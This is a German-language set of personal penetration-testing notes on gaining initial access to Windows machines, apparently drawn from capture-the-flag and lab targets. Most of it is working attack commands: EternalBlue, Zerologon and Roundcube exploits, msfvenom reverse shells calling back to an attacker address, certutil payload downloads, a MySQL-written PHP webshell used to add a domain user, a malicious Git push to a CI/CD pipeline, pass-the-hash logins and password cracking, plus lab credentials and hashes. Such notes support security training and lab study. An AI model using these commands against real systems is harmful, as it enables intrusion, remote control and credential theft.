# Windows Initial-Access


## Ziel der Initial-Access Phase

- Erlangen einer initialen Shell auf dem Zielsystem
- Ausnutzung identifizierter Schwachstellen für Remote Code Execution
- Etablierung eines stabilen Zugriffspunkts für weitere Aktionen

---

## Relevante Techniken & Vorgehensweisen

### Metasploit Exploitation

**EternalBlue (MS17-010):**


```bash
msfconsole
search CVE:2017-0144
# oder
search eternalblue

# Exploit auswählen
use 0  # exploit/windows/smb/ms17_010_eternalblue

# Konfiguration
show options
set RHOSTS <TARGET_IP>
exploit
```

**SMB Scanner (Vulnerability Verification):**

bash

```bash
use 24  # auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS <TARGET_IP>
run
```

**Payload-Änderung bei Fehlschlag:**

msf

```msf
show payloads linux/x86
# Non-staged reverse shell auswählen
run
```

**Jenkins Brute Force:**


```bash
msfconsole
use auxiliary/scanner/http/jenkins_login
set RHOSTS <TARGET_IP>
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

**Tomcat Manager Deploy:**


```bash
msfconsole -q
search type:exploit name:tomcat

# Module
use exploit/multi/http/tomcat_mgr_deploy
use exploit/multi/http/tomcat_mgr_upload

# Konfiguration: RHOSTS, RPORT, USERNAME, PASSWORD
```

**WordPress Crop-Image RCE:**


```bash
msfconsole -q
use exploit/multi/http/wp_crop_rce
set rhost blog.thm
set username kwheel
set password cutiepie1
exploit
```

### Samba Exploits

**Trans2open (Samba 2.2.1a):**


```bash
# Metasploit
search trans2open
use 1
set RHOSTS <TARGET_IP>
exploit
```

**OpenLuck (Apache mod_ssl):**


```bash
# Repository klonen
mkdir ~/Kioptrix_lvl_1
cd ~/Kioptrix_lvl_1
git clone https://github.com/heltonWernik/OpenLuck.git
cd OpenLuck

# Kompilieren
sudo apt install libssl-dev
gcc -o OpenFuck OpenFuck.c -lcrypto

# Ausführen
./OpenFuck  # Optionen anzeigen
./OpenFuck 0x6b <TARGET_IP> -c 40
```

### Web Application Exploitation

**SQL Injection (Joomla 3.7.0):**


```bash
# Joomblah Script
wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
python3 joomblah.py http://<TARGET_IP>
```

**LFI (Local File Inclusion):**


```bash
# Windows
curl "http://<TARGET_IP>/dev/index.html?view=../../../../Windows/win.ini"

# PHP Filter (Base64-encoded source)
curl "http://<TARGET_IP>/dev/index.html?view=php://filter/convert.base64-encode/resource=index.html"
curl "http://<TARGET_IP>/dev/index.html?view=php://filter/convert.base64-encode/resource=db.php"

# Base64 dekodieren
echo 'BASE64_STRING' | base64 -d
```

**LFI zu RCE (BoltWire):**


```bash
# /etc/passwd lesen
curl "http://<TARGET_IP>:8080/boltwire/index.php?p=action.search&action=../../../../../../../../../../etc/passwd"
```

**Jenkins Script Console (Groovy Reverse Shell):**

groovy

```groovy
# Login: http://<TARGET_IP>:8080
# Username: jenkins
# Password: jenkins
# Navigate: Manage Jenkins → Script Console
# Payload: Groovy Reverse Shell (modify IP/Port)
```

**CI/CD Pipeline Abuse (Gitea):**


```bash
# Repository klonen
git clone http://ellen.freeman:TOKEN@<TARGET_IP>:3000/ellen.freeman/website.git
cd website

# ASPX Payload erstellen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=9001 -f aspx -o shell.aspx

# Git konfigurieren und pushen
git config user.name "ellen.freeman"
git config user.email "ellen.freeman@lock.vl"
git add shell.aspx
git commit -m "add shell"
git push http://TOKEN@<TARGET_IP>:3000/ellen.freeman/website.git
```

**Roundcube RCE (CVE-2025-49113):**


````bash
msfconsole
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
set USERNAME admin@hybrid.vl
set PASSWORD Duckling21
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
set VHOST mail01.hybrid.vl
exploit
```

### Template/Theme Modification

**Joomla Template Injection:**
```
1. Login: http://<TARGET_IP>/administrator/
2. Extensions → Templates → Templates
3. Protostar Details and Files → index.php
4. PHP Reverse Shell einfügen (PentestMonkey)
5. Save
6. Trigger: curl http://<TARGET_IP>/
```

**WordPress Theme Editor:**
```
Similar approach via Appearance → Theme Editor
````

### Database-to-Webshell

**MySQL File Write:**


```bash
# Verbindung
mysql -h <TARGET_IP> -u root -p --skip-ssl

# Webshell erstellen
SELECT "<?php echo shell_exec($_GET['c']); ?>" 
INTO OUTFILE 'C:/xampp/htdocs/dev/back.php';
```

**Webshell-Nutzung:**


```bash
curl "http://<TARGET_IP>/dev/back.php?c=whoami"
curl "http://<TARGET_IP>/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add%20/domain"
```

### Credential-Based Access

**SSH mit Private Key:**


```bash
cd ~
chmod 600 id_rsa
ssh -i id_rsa jeanpaul@<TARGET_IP>
# Password: I_love_java
```

**RDP (xfreerdp3):**


```bash
# Kiosk Mode
xfreerdp3 /v:<TARGET_IP> /u:"" /cert:ignore /tls:seclevel:0 /sec:tls +clipboard +dynamic-resolution

# Mit Credentials
xfreerdp3 /v:<TARGET_IP> /u:Gale.Dekarios /p:'ty8wnW9qCKDosXo6'
```

**SMBClient:**


```bash
smbclient \\\\<TARGET_IP>\\BillySMB
# Password: <leer für anonymous>
```

**Evil-WinRM:**


```bash
evil-winrm -i <TARGET_IP> -u 'Caroline.Robinson' -p 'NewPassword123!@'
evil-winrm -i retro.vl -u 'administrator' -H '252fac7066d93dd009d4fd2cd0368389'
```

**PSExec (Pass-the-Hash):**


```bash
psexec.py -hashes :c06552bdb50ada21a7c74536c231b848 Administrator@<TARGET_IP>
```

### Password Cracking

**Hash-Typen:**


```bash
# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt (Joomla)
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# ZIP-Passwort
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip

# MS Access Database
office2john staff.accdb > hash.txt
john --format=office --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# KeePass
keepass2john passwords.kdbx > keepass.hash
hashcat -m 13400 keepass.hash rockyou.txt

# mRemoteNG
git clone https://github.com/gquere/mRemoteNG_password_decrypt.git
cd mRemoteNG_password_decrypt
python3 mremoteng_decrypt.py ../config.xml
```

**Hydra (HTTP Basic Auth):**


```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt http-get://<TARGET_IP>/protected
```

**WPScan (WordPress):**


```bash
wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm
```

### Payload Generation

**MSFVenom:**


```bash
# Windows Reverse TCP
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=7777 -f exe -o Wise.exe

# ASPX Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx > shell.aspx

# 64-bit Windows Reverse Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=7777 -f exe -o Wise.exe
```

### Listener

**Netcat:**


```bash
nc -nvlp 8044
nc -nlvp 9001
nc -lnvp 7777
```

**Metasploit Handler:**


```bash
# Automatisch bei exploit-Modulen
```

### Zerologon (CVE-2020-1472)

**Exploit:**


```bash
# Repository klonen
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472

# Exploit ausführen
python3 cve-2020-1472-exploit.py <NETBIOS_NAME> <TARGET_IP>
# Beispiel: python3 cve-2020-1472-exploit.py BLN01 10.10.114.178

# DCSync nach Exploit
secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
```

**Passwort-Wiederherstellung:**


````bash
python3 restorepassword.py <DOMAIN>/<DC_NAME>\$@<DC_NAME> -target-ip <TARGET_IP> -hexpass <PLAIN_PASSWORD_HEX>
```

---

## Betriebssystem-spezifische Aspekte (Windows)

### Windows Shells

**CMD Escape (Kiosk Mode):**
```
1. Windows-Taste drücken
2. Microsoft Edge öffnen
3. file:///C: eingeben
4. Zu System32 navigieren
5. CMD.exe herunterladen
6. Mit F2 umbenennen zu msedge.exe
7. Doppelklick → CMD Shell
````


**Shell Stabilisierung:**


```bash
# TTY Upgrade (Linux)
python -c "import pty; pty.spawn('/bin/bash')"

# Windows
SHELL=/bin/bash script -q /dev/null
```

### Windows-spezifische Payloads

**ASPX:**

- Wird von IIS ausgeführt
- Ideal für Windows-Webserver

**EXE:**

- Native Windows-Binaries
- Für Service-Manipulation

### Datei-Transfer

**Certutil:**


```cmd
certutil.exe -urlcache -f http://<ATTACKER_IP>/winPEASx64.exe winPEASx64.exe
certutil -urlcache -f http://<ATTACKER_IP>/Wise.exe Wise.exe
```

**Python HTTP Server:**


```bash
python3 -m http.server 80
python3 -m http.server 8000
python3 -m http.server 8000 --bind <ATTACKER_IP>
```

**SMB-Share Upload:**


```bash
# Via smbclient
put shell.aspx
```

---

## Typische Angriffsflächen

### SMB-Vulnerabilities

- **EternalBlue (MS17-010):** Windows 7, Server 2008 R2
- **Samba 2.2.1a:** Trans2open Buffer Overflow

### Web Application Vulnerabilities

- **Joomla 3.7.0:** SQL Injection (CVE-2017-8917)
- **WordPress 5.0:** Crop-image Shell Upload
- **Jenkins:** Default Credentials (jenkins:jenkins)
- **Tomcat Manager:** Authenticated Upload/Deploy
- **BoltWire:** LFI zu /etc/passwd
- **Roundcube:** Auth RCE (CVE-2025-49113)
- **Gitea:** CI/CD Pipeline ohne Validierung

### Konfigurationsfehler

- **Template/Theme Editing:** Joomla, WordPress
- **Script Console:** Jenkins Groovy Execution
- **Database Access:** MySQL mit OUTFILE-Rechten
- **Anonymous SMB:** Credential Exposure

### Credential Exposure

- **Git History:** Hardcoded Access Tokens
- **Configuration Files:** config.php, wp-config.php, config.xml
- **NFS Shares:** Backups mit Credentials
- **LDAP:** Klartext-Passwörter in Beschreibungen

---

## Wichtige Befehle & Syntax

### Searchsploit


```bash
searchsploit Samba 2.2.1a
searchsploit wordpress 5.0.0
```

### MSFVenom Parameter


```bash
-p    # Payload
-f    # Format (exe, aspx)
-o    # Output-Datei
LHOST # Listener-IP
LPORT # Listener-Port
```

### Certutil Parameter


```bash
-urlcache  # Download via URL
-f         # Force (auch wenn cached)
```

### Fcrackzip Parameter


````bash
-v  # Verbose
-u  # Unzip test (verify password works)
-D  # Dictionary attack
-p  # Path to wordlist
```

---

## Reihenfolge & Abhängigkeiten

### Exploit-Flow

1. **Vulnerability Research** → CVE/Exploit finden
2. **Listener starten** → Vor Exploit-Trigger
3. **Exploit ausführen** → RCE erzielen
4. **Shell stabilisieren** → TTY/PowerShell
5. **Persistence prüfen** → Verbindung stabil?

### Template Modification Flow

1. **Admin-Zugang** → Via Credentials
2. **Template auswählen** → Aktives Theme/Template
3. **Reverse Shell** → PHP/ASPX Code
4. **Save** → Änderungen speichern
5. **Trigger** → Homepage aufrufen

### Database-to-Webshell Flow

1. **DB-Credentials** → Aus Config-Dateien
2. **MySQL Login** → Oft --skip-ssl nötig
3. **OUTFILE Permission** → Prüfen
4. **Webshell schreiben** → In Webroot
5. **Testing** → curl mit Parameter

### CI/CD Abuse Flow

1. **Access Token** → Git History durchsuchen
2. **Repository klonen** → Mit Token
3. **Payload erstellen** → msfvenom
4. **Git Push** → Automatisches Deployment
5. **Warten** → 1-2 Minuten für Pipeline
6. **Trigger** → Shell aufrufen

### Zerologon Flow

1. **Vulnerability Check** → nxc zerologon-Modul
2. **Exploit ausführen** → DC Machine Account auf leer
3. **DCSync** → Alle Hashes dumpen
4. **Pass-the-Hash** → Administrator-Zugriff
5. **Optional:** Passwort wiederherstellen

---

## Typische Findings & Fehler

### Erfolgreiche Exploits aus meinen Notes

**EternalBlue:**
```
Target: Windows 7 Ultimate 7601 Service Pack 1
Result: NT AUTHORITY\SYSTEM
Note: Mehrere Versuche nötig, Payload-Wechsel zu non-staged
```

**Joomla SQL Injection:**
```
Version: 3.7.0
Credentials: jonah:spiderman123
Hash: $2y$10$... (bcrypt)
Result: Admin Panel Access
```

**Jenkins:**
```
Default: jenkins:jenkins
Exploit: Groovy Script Console → Reverse Shell
Result: butler user
```

**Tomcat Manager:**
```
Credentials: bob:bubbles
Port: 1234
Result: WAR Deployment möglich
```

**Zerologon:**
```
Target: Windows Server 2008 R2, 2022
Result: DC Machine Account Password = leer
Impact: Full Domain Compromise via DCSync
```

### Fehlgeschlagene Angriffe aus meinen Notes

**Hydra SSH:**
- KEX-Algorithmus-Mismatch
- Keine gültigen Credentials gefunden

**OpenFuck:**
- Connection zu pastebin.com fehlgeschlagen

**RDP mit Credentials:**
- Login fehlschlägt, alternative RCE-Methode nötig

### Häufige Fehler

**Shell verliert Verbindung:**
- Listener nicht gestartet
- Firewall blockiert
- Payload-Architektur falsch (x64 vs x86)

**Template-Modification schlägt fehl:**
- Keine Schreibrechte
- App Logger blockiert Execution
- Falsches Template (nicht aktiv)

**MSFVenom-Payload funktioniert nicht:**
- LHOST falsch (127.0.0.1 statt VPN-IP)
- Port bereits belegt
- Antivirus blockiert

**Database Webshell:**
- OUTFILE-Rechte fehlen
- Webroot-Pfad falsch
- SQL-Syntax-Fehler

**CI/CD Pipeline:**
- Token ungültig/expired
- Pipeline dauert länger als erwartet (1-2 Min)
- Falscher Branch

**Zerologon:**
- NetBIOS-Name falsch (nicht Hostname)
- DC-Passwort wurde bereits geändert
- Patch installiert (nicht verwundbar)

### Credentials aus Initial Access
```
jenkins:jenkins
bob:bubbles
kwheel:cutiepie1
ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f (Token)
admin@hybrid.vl:Duckling21
jonah:spiderman123
root:SuperSecureMySQLPassw0rd1337. (MySQL)
````

### Shell-Typen

**Meterpreter:**

- Metasploit-Exploits
- Interaktive Post-Exploitation

**Netcat Reverse Shell:**

- Einfach, stabil
- Manuelles Upgrade nötig

**Webshell:**

- Via URL-Parameter
- Kein TTY
- Gut für Domain User Creation

**SSH:**

- Mit Private Key oder Password
- Stabil, vollwertiges TTY

**RDP:**

- GUI-Zugriff
- Für Kiosk-Escapes

**Evil-WinRM:**

- PowerShell Remoting
- Windows-native
- Ideal für Domain-Accounts
